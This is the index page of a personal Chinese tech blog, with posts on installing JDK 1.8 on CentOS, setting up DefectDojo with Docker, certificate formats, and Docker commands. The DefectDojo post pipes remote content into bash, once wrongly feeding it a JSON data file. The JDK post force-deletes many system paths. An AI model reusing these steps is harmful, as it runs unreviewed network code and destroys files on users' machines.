<!DOCTYPE html><html lang="zh-Hans"><head><!--[if IE]><style>body{display:none;}</style><script>alert('IE浏览器下无法展示效果，请更换浏览器！');var headNode=document.getElementsByTagName('head')[0];var refresh=document.createElement('meta');refresh.setAttribute('http-equiv','Refresh');refresh.setAttribute('Content','0; url=http://outdatedbrowser.com/');headNode.appendChild(refresh);</script><![endif]--><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="author" content="m01ly"><meta name="baidu-site-verification" content="yvSXOjM1ag"><meta name="google-site-verification" content="riwnp5QCq6dRKbhBa3d3aDZrfGLQVhMFN9d4fMGYuoU"><meta name="description" content="description123456"><meta property="og:type" content="website"><meta property="og:title" content="Hexo"><meta property="og:url" content="https://m01ly.github.io/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="description123456"><meta property="og:locale"><meta property="article:author" content="m01ly"><meta property="article:tag" content="description123456"><meta name="twitter:card" content="summary"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="shortcut icon" href="/favicon.ico"><link href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css" rel="stylesheet"><link rel="stylesheet" href="/css/style.css"><title>Hexo</title><script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><script src="//cdn.bootcss.com/aos/2.2.0/aos.js"></script><script>var yiliaConfig={fancybox:!0,isHome:!0,isPost:!1,isArchive:!1,isTag:!1,isCategory:!1,fancybox_js:"//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js",search:!0}</script><script>yiliaConfig.jquery_ui=[!1]</script><script>yiliaConfig.rootUrl="/"</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/rss+xml">
<link rel="stylesheet" href="/css/prism-a11y-dark.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div id="container"><div class="left-col"><div class="intrude-less"><header id="header" class="inner"><a href="/" class="profilepic"><img src="/img/avatar.jpg"></a><hgroup><h1 class="header-author"><a href="/">m01ly</a></h1></hgroup><p class="header-subtitle">人生在世，全靠命</p><form id="search-form"><input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false"> <i class="fa fa-times" onclick="resetSearch()"></i></form><div id="local-search-result"></div><p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p><div id="switch-btn" class="switch-btn"><div class="icon"><div class="icon-ctn"><div class="icon-wrap icon-house" data-idx="0"><div class="birdhouse"></div><div class="birdhouse_holes"></div></div><div class="icon-wrap icon-ribbon hide" data-idx="1"><div class="ribbon"></div></div><div class="icon-wrap icon-link hide" data-idx="2"><div class="loopback_l"></div><div class="loopback_r"></div></div><div class="icon-wrap icon-me hide" data-idx="3"><div class="user"></div><div class="shoulder"></div></div></div></div><div class="tips-box hide"><div class="tips-arrow"></div><ul class="tips-inner"><li>菜单</li><li>标签</li><li>友情链接</li><li>目标</li></ul></div></div><div id="switch-area" class="switch-area"><div class="switch-wrap"><section class="switch-part switch-part1"><nav class="header-menu"><ul><li><a href="/">主页</a></li><li><a href="/archives/">所有文章</a></li><li><a href="/tags/">标签云</a></li><li><a href="/about/">简历</a></li></ul></nav><nav class="header-nav"><ul class="social"><a class="fa GitHub" target="_blank" rel="noopener" href="https://github.com/m01ly" title="GitHub"></a> <a class="fa RSS" href="/atom.xml" title="RSS"></a> <a class="fa 网易云音乐" target="_blank" rel="noopener" href="https://music.163.com/" title="网易云音乐"></a></ul><ul class="social"><div class="donateIcon-position"><p style="display:block"><a class="donateIcon" href="javascript:void(0)" onmouseout='var qr=document.getElementById("donate");qr.style.display="none"' onmouseenter='var qr=document.getElementById("donate");qr.style.display="block"'>赏</a></p><div id="donate"><img id="multipay" src="/img/multipay.png" width="250px" alt="m01ly Multipay"><div class="triangle"></div></div></div></ul></nav></section><section class="switch-part switch-part2"><div class="widget tagcloud" id="js-tagcloud"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/TLS/" rel="tag">TLS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/" rel="tag">个人笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" rel="tag">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" rel="tag">移动安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BAwriteup/" rel="tag">靶场writeup</a></li></ul></div></section><section class="switch-part switch-part3"><div id="js-friends"><a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/TechCatsLab">TechCatsLab</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://yangchenglong11.github.io">YangChengLong</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://jsharkc.github.io">LiuJiaChang</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://blog.yusank.space">YusanKurban</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://blog.lizebang.top">Lizebang</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/sunanxiang">SunAnXiang</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/DoubleWoodH">LinHao</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://blog.littlechao.top">ShiChao</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/Txiaozhe">TangXiaoJi</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/LLLeon">JiaChenHui</a></div></section><section class="switch-part switch-part4"><div id="js-aboutme">不悲不喜，不卑不亢，努力成为一个更好的程序猿！</div></section></div></div></header></div></div><div class="hide-left-col" title="隐藏侧栏"><i class="fa fa-angle-double-left"></i></div><div class="mid-col"><nav id="mobile-nav"><div class="overlay"><div class="slider-trigger"></div><h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">m01ly</a></h1></div><div class="intrude-less"><header id="header" class="inner"><a href="/" class="profilepic"><img src="/img/avatar.jpg"></a><hgroup><h1 class="header-author"><a href="/" title="回到主页">m01ly</a></h1></hgroup><p class="header-subtitle">人生在世，全靠命</p><nav class="header-menu"><ul><li><a href="/">主页</a></li><li><a href="/archives/">所有文章</a></li><li><a href="/tags/">标签云</a></li><li><a href="/about/">简历</a></li><div class="clearfix"></div></ul></nav><nav class="header-nav"><ul class="social"><a class="fa GitHub" target="_blank" href="https://github.com/m01ly" title="GitHub"></a> <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a> <a class="fa 网易云音乐" target="_blank" href="https://music.163.com/" title="网易云音乐"></a></ul></nav></header></div><link class="menu-list" tags="标签" friends="友情链接" about="目标"></nav><div class="body-wrap"><article id="post-linux-jdk8" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/02/18/linux-jdk8/" class="article-date"><time class="published" datetime="2021-02-18T07:22:20.000Z" itemprop="datePublished">2021-02-18 发布</time> <time class="updated" datetime="2021-02-18T06:44:06.875Z" itemprop="dateUpdated">2021-02-18 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/02/18/linux-jdk8/">linux安装jdk1.8</a></h1></header><div class="article-entry" itemprop="articleBody"><h1 id="1-查看旧版本"><a href="#1-查看旧版本" class="headerlink" title="1 查看旧版本"></a>1 查看旧版本</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">which</span> java
<span class="token function">whereis</span> java
java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1604406880320.png" alt="1604406880320"></p><h1 id="2-替换成1-8版本"><a href="#2-替换成1-8版本" class="headerlink" title="2 替换成1.8版本"></a>2 替换成1.8版本</h1><p>可以发现本机上有两个java，但是目前使用的是1.7的，直接修改/etc/profile配置文件，讲JAVA_HOME修改为1.8jdk所在的路径即可。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603862700214.png" alt="1603862700214"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1604407037055.png" alt="1604407037055"></p><p>这里可以看到centos7自带的仅仅是jre，并没有装jdk，此时最好卸载自带的重新安装jdk8</p><h2 id="3-重新安装1-8"><a href="#3-重新安装1-8" class="headerlink" title="3 重新安装1.8"></a>3 重新安装1.8</h2><p>若原主机没有1.8版本，则此时需要先卸载旧版本，再安装1.8版本。</p><h2 id="3-1-卸载旧版本"><a href="#3-1-卸载旧版本" class="headerlink" title="3.1 卸载旧版本"></a>3.1 卸载旧版本</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum remove java-1.8.0-openjdk#采用yum install -y java-1.8.0-openjdk方式安装的卸载方法</span>
<span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find / -name java</span>
/etc/pki/ca-trust/extracted/java
/etc/pki/java
/etc/alternatives/java
/etc/java
/var/lib/alternatives/java
/usr/bin/java
/usr/lib/java
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java
/usr/share/elasticsearch/jdk/bin/java
/usr/share/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/ca-trust/extracted/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/alternatives/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/alternatives/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/bin/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/elasticsearch/jdk/bin/java
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-安装1-8版本java"><a href="#3-2-安装1-8版本java" class="headerlink" title="3.2 安装1.8版本java"></a>3.2 安装1.8版本java</h2><p>执行下面命令进行安装1.8jdk。这里有个地方要注意，要选择 要带有-devel的安装，因为这个安装的是jdk，<strong>而那个不带-devel的安装完了其实是jre。</strong></p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y java-1.8.0-openjdk-devel.x86_64
java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603870468396.png" alt="1603870468396"></p><h2 id="3-3-修改环境变量"><a href="#3-3-修改环境变量" class="headerlink" title="3.3 修改环境变量"></a>3.3 修改环境变量</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span class="token comment" spellcheck="true">#修改JAVA_HOME为jdk目录</span>
<span class="token keyword">echo</span> <span class="token variable">$JAVA_HOME</span><span class="token comment" spellcheck="true">#查看环境变量</span>
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603868088313.png" alt="1603868088313"></p><p>让profile文件立即生效 ，1.8java安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603867783946.png" alt="1603867783946"></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><span class="post-count">总字数443</span> <span class="post-count">预计阅读2分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-esc-DefectDojo" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/01/21/esc-DefectDojo/" class="article-date"><time class="published" datetime="2021-01-21T02:22:45.000Z" itemprop="datePublished">2021-01-21 发布</time> <time class="updated" datetime="2021-02-18T06:30:21.965Z" itemprop="dateUpdated">2021-02-18 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/01/21/esc-DefectDojo/">DefectDojo安装与使用</a></h1></header><div class="article-entry" itemprop="articleBody"><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1 前期准备"></a>1 前期准备</h1><h2 id="1-1-官方文档"><a href="#1-1-官方文档" class="headerlink" title="1.1 官方文档"></a>1.1 官方文档</h2><p>github地址:<a target="_blank" rel="noopener" href="https://github.com/DefectDojo/django-DefectDojo">https://github.com/DefectDojo/django-DefectDojo</a></p><p>官方文档:<a target="_blank" rel="noopener" href="https://defectdojo.readthedocs.io/en/latest/about.html">https://defectdojo.readthedocs.io/en/latest/about.html</a></p><h2 id="1-2-环境版本"><a href="#1-2-环境版本" class="headerlink" title="1.2 环境版本"></a>1.2 环境版本</h2><h3 id="1-2-1-docker-compose"><a href="#1-2-1-docker-compose" class="headerlink" title="1.2.1 docker-compose"></a>1.2.1 docker-compose</h3><p>使用docker-compose进行安装至少需要docker 18.09.4和docker-compose 1.22.0,如果没有安装,则按照下面命令安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/bin/
<span class="token function">wget</span> https://github.com/docker/compose/releases/download/1.22.0/docker-compose-Linux-x86_64
<span class="token function">rename</span> docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64
<span class="token function">chmod</span> +x /usr/local/bin/docker-compose
./docker-compose version
<span class="token function">sudo</span> <span class="token function">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose<span class="token comment" spellcheck="true">#加个软连接</span>
docker-compose version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/01/21/esc-DefectDojo/1611195834714.png" alt="1611195834714"></p><h3 id="1-2-2-python版本3之上"><a href="#1-2-2-python版本3之上" class="headerlink" title="1.2.2 python版本3之上"></a>1.2.2 python版本3之上</h3><p><img src="/2021/01/21/esc-DefectDojo/1611652410659.png" alt="1611652410659"></p><h1 id="2-安装"><a href="#2-安装" class="headerlink" title="2 安装"></a>2 安装</h1><h2 id="2-1-下载安装"><a href="#2-1-下载安装" class="headerlink" title="2.1 下载安装"></a>2.1 下载安装</h2><p>执行下面的命令,进行安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/DefectDojo/django-DefectDojo
<span class="token function">cd</span> django-DefectDojo
<span class="token comment" spellcheck="true"># building</span>
docker-compose build
<span class="token comment" spellcheck="true"># running</span>
docker-compose up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>执行docker-compose build时候,会报错如下:(如果build有错,也可直接up就行)</strong></p><p>curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused</p><p><img src="/2021/01/21/esc-DefectDojo/1611211553110.png" alt="1611211553110"></p><p><a target="_blank" rel="noopener" href="https://github.com/hawtim/blog/issues/10">解决办法</a>：</p><p><img src="/2021/01/21/esc-DefectDojo/1611211540151.png" alt="1611211540151"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/hosts<span class="token comment" spellcheck="true">#编辑hosts,添加如下映射</span>
199.232.96.133 raw.githubusercontent.com
199.232.96.133 user-images.githubusercontent.com
199.232.96.133 avatars2.githubusercontent.com
199.232.96.133 avatars1.githubusercontent.com

/etc/init.d/networking restart<span class="token comment" spellcheck="true">#重启网络</span>
<span class="token function">service</span> network restart<span class="token comment" spellcheck="true">#或者这种方法重启网络</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以访问下面几个网址测试是否修改成功,</p><pre class="line-numbers language-bash"><code class="language-bash">curl -L https://raw.githubusercontent.com/pyupio/safety-db/master/data/insecure_full.json <span class="token operator">|</span> <span class="token function">bash</span> -s stable
curl -L https://get.rvm.io <span class="token operator">|</span> <span class="token function">bash</span> -s stable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/01/21/esc-DefectDojo/1612339821470.png" alt="1612339821470"></p><p><img src="/2021/01/21/esc-DefectDojo/1611643936373.png" alt="1611643936373"></p><h2 id="2-2-登录"><a href="#2-2-登录" class="headerlink" title="2.2 登录"></a>2.2 登录</h2><p>安装后的初始密码会出线再log里面,直接用下面命令进行查找.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># use docker-compose logs -f initializer to track progress</span>
docker-compose logs initializer <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Admin password:"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果显示如下用户密码已经存在,但是自己忘记密码了密码,可以重新创建新用户及密码</p><p><img src="/2021/01/21/esc-DefectDojo/1612340052892.png" alt="1612340052892"></p><pre class="line-numbers language-bash"><code class="language-bash">docker-compose <span class="token function">exec</span> uwsgi /bin/bash -c <span class="token string">'python manage.py createsuperuser'</span><span class="token comment" spellcheck="true">#创建新的超级用户和密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问: <a target="_blank" rel="noopener" href="http://localhost:8080/%E6%88%96%E8%80%85http://10.27.22.92:8080/dashboard">http://localhost:8080/或者http://10.27.22.92:8080/dashboard</a></p><p><img src="/2021/01/21/esc-DefectDojo/1612340217583.png" alt="1612340217583"></p><h1 id="3-使用"><a href="#3-使用" class="headerlink" title="3 使用"></a>3 使用</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://owasp.org/www-pdf-archive/Defectdojo-owasp-stammtisch-final.pdf">Defectdojo架构</a></p><p><a target="_blank" rel="noopener" href="https://readthedocs.org/projects/defectdojo/downloads/pdf/latest/">相关文档pdf</a></p><p><a target="_blank" rel="noopener" href="https://github.com/DefectDojo/django-DefectDojo/issues/2018">Defectdojo问题列表解决</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><span class="post-count">总字数472</span> <span class="post-count">预计阅读2分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-cipher-certificate-format" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2020/10/10/cipher-certificate-format/" class="article-date"><time class="published" datetime="2020-10-10T06:56:33.000Z" itemprop="datePublished">2020-10-10 发布</time> <time class="updated" datetime="2020-10-12T01:48:25.406Z" itemprop="dateUpdated">2020-10-12 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2020/10/10/cipher-certificate-format/">证书的各种格式</a></h1></header><div class="article-entry" itemprop="articleBody"><p>证书主要的文件类型和协议有: PEM、DER、PFX、JKS、KDB、CER、KEY、CSR、CRT、CRL 、OCSP、SCEP等。</p><p>一编码格式</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hqy1719239337/article/details/88896074">https://blog.csdn.net/hqy1719239337/article/details/88896074</a></p><p>二 文件后缀</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bolang789/article/details/74942925">https://blog.csdn.net/bolang789/article/details/74942925</a></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yetugeng/article/details/100629159">https://blog.csdn.net/yetugeng/article/details/100629159</a></p><p>三 后缀转化</p><p><a target="_blank" rel="noopener" href="http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/">http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul></div><span class="post-count">总字数95</span> <span class="post-count">预计阅读1分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-docker-guide" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2020/09/28/docker-guide/" class="article-date"><time class="published" datetime="2020-09-28T07:22:20.000Z" itemprop="datePublished">2020-09-28 发布</time> <time class="updated" datetime="2021-02-03T09:20:10.496Z" itemprop="dateUpdated">2021-02-03 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2020/09/28/docker-guide/">docker使用大全</a></h1></header><div class="article-entry" itemprop="articleBody"><h1 id="1-docker安装"><a href="#1-docker安装" class="headerlink" title="1 docker安装"></a>1 docker安装</h1><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p><p>$ <strong>sudo</strong> <strong>yum remove</strong> docker<br>docker-client<br>docker-client-latest<br>docker-common<br>docker-latest<br>docker-latest-logrotate<br>docker-logrotate<br>docker-engine</p><h4 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>可以选择国内的一些aliyun源地址：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager \
    --add-repo \
    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="安装-Docker-Engine-Community-1"><a href="#安装-Docker-Engine-Community-1" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>安装最新版本的 Docker Engine-Community 和 containerd，或者转到下一步安装特定版本：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce docker-ce-cli containerd.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="启动-Docker。"><a href="#启动-Docker。" class="headerlink" title="启动 Docker。"></a>启动 Docker。</h4><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> docker run hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/28/docker-guide/1603272603871.png" alt="1603272603871"></p><h1 id="2-docker常用命令"><a href="#2-docker常用命令" class="headerlink" title="2 docker常用命令"></a>2 docker常用命令</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$docker</span> search ubantu <span class="token comment" spellcheck="true">#搜索镜像</span>
<span class="token variable">$docker</span> pull ubantu  <span class="token comment" spellcheck="true">#载入镜像</span>
<span class="token variable">$docker</span> run -it ubuntu /bin/bash <span class="token comment" spellcheck="true">#启动镜像</span>
root@ed09e4490c57:/<span class="token comment" spellcheck="true"># exit退出容器</span>
$ docker <span class="token function">ps</span> -a  <span class="token comment" spellcheck="true">#查看所有的容器</span>
$ docker <span class="token function">ps</span> -l <span class="token comment" spellcheck="true">#查看最后一次创建的容器</span>
$ docker start b750bbbcfd88  <span class="token comment" spellcheck="true">#使用 docker start 启动一个已停止的容器</span>
$ docker stop <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span>  <span class="token comment" spellcheck="true">#停止一个容器</span>
$ docker restart <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span>  <span class="token comment" spellcheck="true">#重启一个容器</span>
$ docker <span class="token function">rm</span> -f <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span> <span class="token comment" spellcheck="true">#删除一个容器</span>
$ docker rmi  <span class="token operator">&lt;</span>镜像名称<span class="token operator">></span> <span class="token comment" spellcheck="true">#删除一个镜像</span>
$ docker run -itd --name ubuntu-test ubuntu /bin/bash <span class="token comment" spellcheck="true">#后台运行容器</span>
$ docker <span class="token function">exec</span> -it <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span> /bin/bash <span class="token comment" spellcheck="true">#进入一个容器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>镜像打包如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$docker</span> <span class="token function">ps</span> 
<span class="token variable">$docker</span> login harbor.XX.io/openvas 
<span class="token comment" spellcheck="true">#输入域帐号&amp;密码</span>
<span class="token variable">$docker</span> commit <span class="token operator">&lt;</span>容器name<span class="token operator">></span> harbor.XX.io/openvas:<span class="token punctuation">[</span>tag_openvas_20200710_XXXX<span class="token punctuation">]</span>
<span class="token variable">$docker</span> push harbor.XX.io/openvas:<span class="token punctuation">[</span>tag_openvas_20200710_XXXX<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-1-docker-访问宿主机目录"><a href="#2-1-docker-访问宿主机目录" class="headerlink" title="2.1 docker 访问宿主机目录"></a>2.1 docker 访问宿主机目录</h2><h3 id="挂载一个目录"><a href="#挂载一个目录" class="headerlink" title="挂载一个目录"></a>挂载一个目录</h3><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行之后，相当于把此数据目录挂载在对应docker的目录中，用 即可查看并访问所挂载数据。Dockerfile中最后一行运行相应的</p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -it -m 4G -v /var/log/suricata:/mnt -p 5601:5601 -p 9200:9200 -p 5044:5044 sebp/elk: 638</span>
<span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker ps -a</span>
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                              NAMES
45a7bc7b174d        sebp/elk:623        <span class="token string">"/usr/local/bin/star…"</span>   13 hours ago        Up 12 hours         0.0.0.0:5044-<span class="token operator">></span>5044/tcp, 0.0.0.0:5601-<span class="token operator">></span>5601/tcp, 0.0.0.0:9200-<span class="token operator">></span>9200/tcp, 9300/tcp   charming_wu
<span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it 45a7bc7b174d bash</span>
root@45a7bc7b174d:/<span class="token comment" spellcheck="true"># ls</span>
